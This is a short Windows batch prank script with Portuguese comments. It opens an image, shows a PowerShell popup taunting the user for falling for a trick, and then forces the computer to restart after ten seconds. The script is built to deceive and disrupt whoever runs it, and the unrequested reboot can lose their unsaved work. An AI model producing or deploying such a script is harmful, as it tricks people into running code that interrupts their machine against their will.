@echo off

rem Abre a imagem com o visualizador padrão do sistema
start "" "imagens\teste.png"

rem Pausa para que a imagem possa ser visualizada

rem Exibe um popup com a mensagem usando PowerShell
powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Voce caiu na maracutaia do Zoobomafoo', 'KKKKKKKKKKKKKKKKKKKKKK')"

rem Reinicia o PC
shutdown /r /t 10
